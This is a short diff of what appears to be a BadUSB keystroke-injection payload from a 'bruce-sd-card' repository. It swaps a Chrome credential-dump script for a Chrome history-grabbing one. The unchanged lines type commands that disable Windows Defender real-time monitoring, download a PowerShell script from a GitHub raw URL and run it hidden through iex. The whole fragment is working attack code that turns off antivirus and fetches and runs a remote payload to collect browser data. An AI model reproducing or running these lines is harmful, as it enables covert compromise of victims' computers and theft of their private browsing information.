@@ -74,7 +74,7 @@ WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true
 
 ## Definir URL do Script
 
-WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/ECCW/ChromeDump/Get-Chrome80Dump.ps1';
+WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/ECCW/ChromeHistory/Get-ChromHistory.ps1';
 WinPrintLine $d=New-Object Net.WebClient;
 WinPrintLine $f='t.ps1';$d.DownloadFile($u,$f);
 WinPrintLine powershell -w h -c "gc $f -Raw|iex";
